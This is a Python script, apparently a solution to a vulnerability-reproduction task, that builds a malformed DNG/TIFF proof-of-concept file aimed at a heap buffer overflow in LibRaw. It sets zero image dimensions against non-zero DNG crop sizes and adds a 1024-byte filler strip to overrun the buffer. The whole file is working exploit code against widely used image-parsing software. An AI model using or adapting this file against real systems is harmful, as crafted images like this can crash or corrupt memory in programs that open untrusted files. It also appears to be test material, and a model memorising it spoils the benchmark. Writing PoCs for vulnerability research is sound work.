import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in LibRaw.
        The vulnerability is caused by a lack of checking for zero width or height images,
        leading to an allocation of size 0 (or insufficient size) followed by a write
        operation based on other parameters (like strip size or DNG crops).
        """
        
        # TIFF Header (Little Endian)
        # Offset 0: II (0x4949)
        # Offset 2: 42 (0x002A)
        # Offset 4: Offset to first IFD (0x00000008)
        header = b'II\x2a\x00\x08\x00\x00\x00'

        # We will construct a DNG-compatible TIFF.
        # Key vulnerability trigger: ImageWidth = 0 and ImageLength = 0.
        # To ensure the decoder attempts to process data, we add DNG-specific tags
        # like DefaultCropSize and ActiveArea with valid non-zero dimensions.
        # This mismatch (Allocation uses 0, Decoding uses 16x16) causes the overflow.

        tags = []

        # Standard TIFF Tags
        # 256: ImageWidth = 0 (Vulnerability Trigger)
        tags.append((256, 4, 1, 0))
        # 257: ImageLength = 0 (Vulnerability Trigger)
        tags.append((257, 4, 1, 0))
        # 258: BitsPerSample = 8
        tags.append((258, 3, 1, 8))
        # 259: Compression = 1 (Uncompressed)
        tags.append((259, 3, 1, 1))
        # 262: PhotometricInterpretation = 1 (BlackIsZero)
        tags.append((262, 3, 1, 1))
        # 277: SamplesPerPixel = 1
        tags.append((277, 3, 1, 1))
        # 278: RowsPerStrip = 1
        tags.append((278, 4, 1, 1))
        # 279: StripByteCounts = 1024 (Enough to overflow a small buffer)
        tags.append((279, 4, 1, 1024))
        
        # DNG Tags
        # 50706: DNGVersion = 1.1.0.0 (Type 1 BYTE, Count 4)
        # Value 0x01, 0x04, 0x00, 0x00 -> Packed in 4 bytes: 0x00000401 (Little Endian)
        tags.append((50706, 1, 4, 0x00000401))

        # We need to handle tags that require data offsets.
        # 273: StripOffsets
        # 50720: DefaultCropSize (16, 16)
        # 50829: ActiveArea (0, 0, 16, 16)
        
        # Calculate offsets
        num_entries = len(tags) + 3 # Adding the 3 offset-based tags
        ifd_size = 2 + num_entries * 12 + 4 # Count + Entries + NextIFD
        
        # Data starts after Header (8) and IFD
        data_offset = 8 + ifd_size
        current_offset = data_offset
        extra_data = b''

        # 1. DefaultCropSize Data (Tag 50720) - Type 4 (LONG), Count 2
        # Value: 16, 16
        crop_data = struct.pack('<II', 16, 16)
        tags.append((50720, 4, 2, current_offset))
        extra_data += crop_data
        current_offset += len(crop_data)

        # 2. ActiveArea Data (Tag 50829) - Type 4 (LONG), Count 4
        # Value: 0, 0, 16, 16
        area_data = struct.pack('<IIII', 0, 0, 16, 16)
        tags.append((50829, 4, 4, current_offset))
        extra_data += area_data
        current_offset += len(area_data)

        # 3. Strip Data (Tag 273) - Type 4 (LONG), Count 1
        # Payload to write into the heap buffer
        payload = b'\x41' * 1024
        tags.append((273, 4, 1, current_offset))
        extra_data += payload
        current_offset += len(payload)

        # Sort tags by ID (Requirement for TIFF)
        tags.sort(key=lambda x: x[0])

        # Pack IFD
        ifd = struct.pack('<H', num_entries)
        for tag, typ, cnt, val in tags:
            # Struct format: Tag(2), Type(2), Count(4), Value/Offset(4)
            ifd += struct.pack('<HHII', tag, typ, cnt, val)
        ifd += struct.pack('<I', 0) # Next IFD offset (0)

        return header + ifd + extra_data
